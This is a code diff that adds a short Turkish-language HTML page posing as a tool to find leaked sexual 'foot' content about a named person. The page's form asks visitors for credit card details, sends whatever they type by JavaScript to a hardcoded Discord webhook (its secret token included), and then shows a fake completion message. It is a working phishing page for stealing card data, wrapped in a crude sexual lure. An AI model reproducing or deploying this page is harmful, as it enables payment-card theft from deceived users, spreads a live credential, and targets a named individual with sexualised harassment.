@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>HÜSEYİN AYAK İFSA BULUCU</title>
+</head>
+<body>
+    <h1>İFŞA</h1>
+    <form id="messageForm">
+        <input type="text" id="messageInput" placeholder="AYAK İFSA İÇİN KREDİ KARTI BİLGİLERİNİ Gİr">
+        <button type="submit" onclick="sendMessage()">BOŞAL</button>
+    </form>
+    <script>
+        function sendMessage() {
+            var messageInput = document.getElementById("messageInput");
+            var message = messageInput.value;
+
+            var webhookUrl = "https://discord.com/api/webhooks/1121844315912675471/VjLDnpl_fcoT-nRlnd3tZRccCGs2WjLLeO58pAV44ahavR2u53DVTaOr_NlMyQM1yjWL";
+
+            var request = new XMLHttpRequest();
+            request.open("POST", webhookUrl);
+
+            var payload = JSON.stringify({ "content": message });
+
+            request.setRequestHeader('Content-type', 'application/json');
+
+            request.send(payload);
+
+            // Optional: Display a confirmation message
+            var messageForm = document.getElementById("messageForm");
+            messageForm.innerHTML = "<p>ifşa tamamlandı İşfa sayfasına gidiliyor!</p>";
+        }
+    </script>
+</body>
+</html>
